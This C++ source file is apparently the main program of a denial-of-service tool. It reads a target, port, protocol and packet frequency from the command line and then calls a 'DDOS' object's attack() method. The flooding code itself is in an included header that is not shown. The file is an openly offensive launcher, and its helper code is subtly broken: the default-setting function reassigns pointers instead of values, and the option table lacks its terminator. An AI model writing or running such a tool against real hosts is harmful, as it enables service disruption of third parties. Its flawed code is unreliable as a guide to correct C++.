#include "../include/commands.hh"

int main(int argc, char **argv) {

  int c;
  struct option options[] = {
      {"port",         required_argument, 0, 'p'},
      {"protocol",     required_argument, 0, 't'},
      {"frequency",    required_argument, 0, 'f'},
      {"target",       required_argument, 0, 'c'}
  };
  map<string, string> commands;

  while(true) {
    c = getopt_long(argc, argv, "p:t:f:c:", options, NULL);

    if (c == -1)
      break;

    switch (c) {
      case 'p':
        commands["port"] = optarg;
        break;

      case 't':
        commands["protocol"] = optarg;
        break;

      case 'f':
        commands["freqency"] = optarg;
        break;

      case 'c':
        commands["target"] = optarg;
        break;

      case '?':
        HELP
        break;

      default:
        DEFAULT
      }
    }

    MIN_SUPER_INT port = atoi(commands["port"].c_str());
    MAX_SUPER_INT frequency = atoi(commands["freqency"].c_str());
    bool protocol = (protocolChecking(commands["protocol"])) ? true : false;

    subChecking(&port, &frequency);

    DDOS go(commands["target"], frequency, port, protocol);
    go.attack();
  return 0;
}

static bool protocolChecking(string target) {
  regex protocol("UDP");
  return (regex_match(target.c_str(), protocol)) ? true : false;
}

template<typename P, typename F>
static void subChecking(P *port, F *frequency) {
  if(port == 0)
    port = (P *) 80;

  if(frequency == 0)
    frequency = (F *) 10;
}
